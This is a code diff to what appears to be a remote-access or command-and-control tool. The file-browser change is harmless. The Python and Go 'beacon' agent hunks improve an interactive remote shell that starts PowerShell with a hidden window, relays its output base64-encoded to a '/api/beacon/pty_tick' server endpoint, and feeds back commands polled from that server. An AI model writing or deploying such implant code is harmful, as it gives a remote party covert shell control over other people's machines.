@@ -1871,8 +1871,8 @@ async function fbRead(agentId, fullPath, filename) {
   const contentEl = document.getElementById('fb-read-content');
   if (!modal) return;
   titleEl.textContent = filename;
-  // Reset any inline styles left by previous file (e.g. PDF sets overflow:hidden)
-  contentEl.style.cssText = '';
+  // Restore base styles (PDF/XLSX branches may have overridden them)
+  contentEl.style.cssText = 'flex:1;min-height:0;overflow:auto;padding:16px;font-size:12px;line-height:1.7;color:var(--text);margin:0;font-family:var(--font-mono)';
   contentEl.innerHTML = `<span style="color:var(--text2);padding:8px">${_lang === 'es' ? 'Leyendo archivo...' : 'Reading file...'}</span>`;
   modal.style.display = 'flex';
 
@@ -3570,18 +3570,25 @@ def run_command(cmd, task_id=None):
         _sid = cmd[8:]
         def _pty_run(sid=_sid):
             if _WIN:
-                _proc = subprocess.Popen(['powershell.exe', '-NoProfile', '-NoLogo'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000)
+                _proc = subprocess.Popen(['powershell.exe', '-NoProfile', '-NoLogo'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, creationflags=0x08000000)
+                # PowerShell in pipe mode skips the prompt — inject one so the user sees output
+                try: _proc.stdin.write(b'Write-Host ("PS " + $PWD.Path + "> ") -NoNewline\\r\\n'); _proc.stdin.flush()
+                except: pass
                 def _rd():
                     while True:
-                        c = _proc.stdout.read(512)
-                        if not c: break
-                        _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': _b64.b64encode(c).decode()})
+                        try:
+                            c = os.read(_proc.stdout.fileno(), 4096)
+                            if not c: break
+                            _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': _b64.b64encode(c).decode()})
+                        except OSError: break
                 _th.Thread(target=_rd, daemon=True).start()
                 while _proc.poll() is None:
                     tk = _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': ''})
                     if not tk or not tk.get('active'): _proc.kill(); break
                     if tk.get('input'):
-                        try: _proc.stdin.write(_b64.b64decode(tk['input'])); _proc.stdin.flush()
+                        try:
+                            _inp = _b64.b64decode(tk['input'])
+                            _proc.stdin.write(_inp); _proc.stdin.flush()
                         except: break
                     time.sleep(0.1)
             else:
@@ -4803,6 +4810,8 @@ func _runCmd(cmd, taskID string) string {
 \t\t\tproc.Stdout = wPipe; proc.Stderr = wPipe; proc.Dir = _cwd
 \t\t\tif proc.Start() != nil { return }
 \t\t\twPipe.Close()
+\t\t\t// PowerShell in pipe mode doesn't print a prompt — inject one so the user sees output
+\t\t\tif isWin { stdin.Write([]byte("Write-Host (\\"PS \\" + $PWD.Path + \\"> \\") -NoNewline\\r\\n")) }
 \t\t\tgo func() {
 \t\t\t\tbuf := make([]byte, 4096)
 \t\t\t\tfor { n, err := rPipe.Read(buf); if n > 0 { _post("/api/beacon/pty_tick", map[string]interface{}{"session_id": sid, "data": base64.StdEncoding.EncodeToString(buf[:n])}) }; if err != nil { break } }
